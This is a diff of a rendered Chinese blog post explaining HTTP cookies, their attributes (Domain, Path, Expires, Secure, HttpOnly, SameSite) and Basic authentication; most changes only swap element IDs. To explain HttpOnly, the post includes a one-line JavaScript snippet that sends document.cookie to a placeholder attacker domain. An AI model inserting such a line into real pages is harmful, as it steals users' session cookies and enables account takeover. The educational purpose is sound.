@@ -356,25 +356,25 @@ Request
 <p><strong>cookie储存在客户端</strong>。Server 可以在 HTTP response
 中返回 <code>Set-Cookie</code> header 来告诉浏览器要设定 cookie。
 设定的语法如下：</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-u4wbemlluxp18z"></i><span>http</span><div class="collapse show" id="collapse-u4wbemlluxp18z"><pre><code class="hljs http"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>[cookie名称]=[cookie值]</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xb075ylmngiym7"></i><span>http</span><div class="collapse show" id="collapse-xb075ylmngiym7"><pre><code class="hljs http"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>[cookie名称]=[cookie值]</code></pre></div></div>
 <p>浏览器看到 <code>Set-Cookie</code> header 便会将 cookie
 储存起来，之后对同一个 domain 发送 HTTP request 的时候，浏览器就会将
 cookie 带在 HTTP request 的 <code>Cookie</code> header 里。</p>
 <p>Request 中的 cookie header 会是 <code>[cookie名称]=[cookie值]</code>
 的形式，用分号串接之后的结果：</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4hykjjlluxp18z"></i><span>http</span><div class="collapse show" id="collapse-4hykjjlluxp18z"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>[cookie1]=[value1]; [cookie2]=[value2]</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5pxv4plmngiym7"></i><span>http</span><div class="collapse show" id="collapse-5pxv4plmngiym7"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>[cookie1]=[value1]; [cookie2]=[value2]</code></pre></div></div>
 <p>当然，Web 服务器需要建立后端数据库，记录用户信息。</p>
 <h4 id="相关参数">相关参数</h4>
 <p>在笔试题目中，也考察过cookie相关参数的含义。这里对此也进行细致的讲解。</p>
 <p>Cookie 除了名称和值之外，通常还需要设定其他额外参数，下面会一一介绍。
 新增参数的方式是用分号区隔各个参数，例如：</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9j3wn0lluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-9j3wn0lluxp18z"><pre><code class="hljs plaintext">user=John; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cuffo3lmngiym7"></i><span>plaintext</span><div class="collapse show" id="collapse-cuffo3lmngiym7"><pre><code class="hljs plaintext">user=John; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT</code></pre></div></div>
 <p>简单地说，我们会用 <code>Domain</code> 和 <code>Path</code> 指定
 cookie 的可用范围，用 <code>Expires</code> 和 <code>Max-Age</code> 控制
 cookie 的有效期限，而 <code>HttpOnly</code>、 <code>Secure</code>、和
 <code>SameSite</code> 则是和安全性相关的参数。</p>
 <h5 id="domain">Domain</h5>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wjeeexlluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-wjeeexlluxp18z"><pre><code class="hljs plaintext">domain=example.com</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xawhsllmngiym7"></i><span>plaintext</span><div class="collapse show" id="collapse-xawhsllmngiym7"><pre><code class="hljs plaintext">domain=example.com</code></pre></div></div>
 <p><code>domain</code> 用来指定哪些网域可以存取这个 cookie。
 <strong>默认值是当前网域，但是不包含其子域。</strong></p>
 <p>例如在 <a target="_blank" rel="noopener" href="http://example.com">example.com</a> 底下设置的 cookie
@@ -385,7 +385,7 @@ cookie 的有效期限，而 <code>HttpOnly</code>、 <code>Secure</code>、和
 <a target="_blank" rel="noopener" href="http://example.com">example.com</a> 以及他的子网域 <a target="_blank" rel="noopener" href="http://subdomain.example.com">subdomain.example.com</a>
 都能够访问这个 cookie。</p>
 <h5 id="path">Path</h5>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-djgvi0lluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-djgvi0lluxp18z"><pre><code class="hljs plaintext">path=/admin</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ocbkkblmngiym7"></i><span>plaintext</span><div class="collapse show" id="collapse-ocbkkblmngiym7"><pre><code class="hljs plaintext">path=/admin</code></pre></div></div>
 <p><code>path</code> 参数用来指定哪些路径可以访问这个cookie。</p>
 <p>例如：假设 domain 是 <a target="_blank" rel="noopener" href="http://example.com">example.com</a>，且
 <code>path=/admin</code>，则 <a target="_blank" rel="noopener" href="http://example.com/admin">example.com/admin</a> 或是子路径 <a target="_blank" rel="noopener" href="http://example.com/admin/settings">example.com/admin/settings</a>
@@ -406,10 +406,10 @@ cookie，如此一来不管在网站的哪个路径下，server 都能认得用�
 <code>expires</code> 或是 <code>max-age</code>。</p>
 <p><code>expires</code> 是 UTC 格式表示的有效期限，在 JavaScript 中可用
 <code>date.toUTCString()</code> 取得：</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xbaobvlluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-xbaobvlluxp18z"><pre><code class="hljs plaintext">cookie=value; expires=Tue, 19 Jan 2038 03:14:07 GMT</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fzhf8llmngiym7"></i><span>plaintext</span><div class="collapse show" id="collapse-fzhf8llmngiym7"><pre><code class="hljs plaintext">cookie=value; expires=Tue, 19 Jan 2038 03:14:07 GMT</code></pre></div></div>
 <p><code>max-age</code> 表示从设定开始算之后几秒之内 cookie
 是有效的：</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uwdg20lluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-uwdg20lluxp18z"><pre><code class="hljs plaintext">cookie=value; max-age=3600</code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uiz0sylmngiym7"></i><span>plaintext</span><div class="collapse show" id="collapse-uiz0sylmngiym7"><pre><code class="hljs plaintext">cookie=value; max-age=3600</code></pre></div></div>
 <h5 id="secure">Secure</h5>
 <p><code>Secure</code> 参数的作用是让 cookie 只能通过 https 传递。
 <strong>Cookie 默认是不区分 http 或是 https 的。</strong></p>
@@ -434,7 +434,7 @@ server，之后这份表单数据在前端呈现的时候恶意的 JavaScript �
 HTML 的一部分被执行。 假设黑客能够执行 JavaScript，便能很轻易地访问
 <code>document.cookie</code>，就能够窃取你用来登入的
 cookie，并且用你的身份做恶意的操作：</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ih39q0lluxp18z"></i><span>javascript</span><div class="collapse show" id="collapse-ih39q0lluxp18z"><pre><code class="hljs javascript"><span class="hljs-comment">// 把你的 cookie 送到黑客的服务器</span>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c4vle8lmngiym7"></i><span>javascript</span><div class="collapse show" id="collapse-c4vle8lmngiym7"><pre><code class="hljs javascript"><span class="hljs-comment">// 把你的 cookie 送到黑客的服务器</span>
 (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>()).<span class="hljs-property">src</span> = <span class="hljs-string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;</code></pre></div></div>
 <p>这就是为什么我们需要禁止 JavaScript 访问 cookie。</p>
 <h4 id="samesite">Samesite</h4>
@@ -478,14 +478,14 @@ cookie 是用来表示用户 id，则对 <a target="_blank" rel="noopener" href=
 realm，并且只允许特定的用户访问。</p>
 <p>在这种认证方法下，用户每次发送请求时，请求头中都必须携带能通过认证的身份信息。下面举例说明。</p>
 <p>1.<strong>客户端(例如Web浏览器)</strong>：向服务器请求图片</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-la2t5rlluxp18z"></i><span>http</span><div class="collapse show" id="collapse-la2t5rlluxp18z"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cover/girl1.jpg</span>  <span class="hljs-string">HTTP/1.1</span></code></pre></div></div>
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gkurfnlmngiym7"></i><span>http</span><div class="collapse show" id="collapse-gkurfnlmngiym7"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cover/girl1.jpg</span>  <span class="hljs-string">HTTP/1.1</span></code></pre></div></div>
 <p>2.<strong>服务器</strong>：这个资源在安全区data里，是受限资源，需要基本认证，请带上你的用户名和密码再来请求</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-44jwy9lluxp18z"></i><span>http</span><div class="collapse show" id="collapse-44jwy9lluxp18z"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">401</span> Authorization Required
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-eeipznlmngiym7"></i><span>http</span><div class="collapse show" id="collapse-eeipznlmngiym7"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">401</span> Authorization Required
 <span class="hljs-attribute">www-Authenticate</span><span class="hljs-punctuation">: </span>Basic realm= "data"</code></pre></div></div>
 <p>服务器会返回401，告知客户端这个资源需要使用基本认证的方式访问，我们可以看到在
 <code>www-Authenticate</code>这个Header里面有两个值，<code>Basic</code>：说明需要基本认证，<code>realm</code>：说明客户端需要输入这个安全区的用户名和密码。因为服务器可以为不同的安全区设置不同的用户名和密码。如果服务器只有一个安全区，那么所有的基本认证用户名和密码都是一样的。</p>
 <p>3.<strong>客户端</strong>：携带相应的用户名密码信息，发送给服务器。</p>
-<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-773joclluxp18z"></i><span>http</span><div class="collapse show" id="collapse-773joclluxp18z"><pre><code class="hljs http">GET /cover/girl1.jpg  HTTP/1.1 
+<div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rb8s76lmngiym7"></i><span>http</span><div class="collapse show" id="collapse-rb8s76lmngiym7"><pre><code class="hljs http">GET /cover/girl1.jpg  HTTP/1.1 
 <span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic
 bHVuYXRpY3NreTp0cWxhMzE0</code></pre></div></div>
 <p>Basic 内容为： <strong>用户名:密码</strong>
@@ -609,9 +609,9 @@ session_id，找到前期保存的数据，由此得知用户的身份。</p>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/64429/" title="重新认识HTTP/1.1">
+                      <a href="/posts/18710/" title="使用frp内网穿透远程访问Vmware虚拟机">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">重新认识HTTP/1.1</span>
+                        <span class="hidden-mobile">使用frp内网穿透远程访问Vmware虚拟机</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
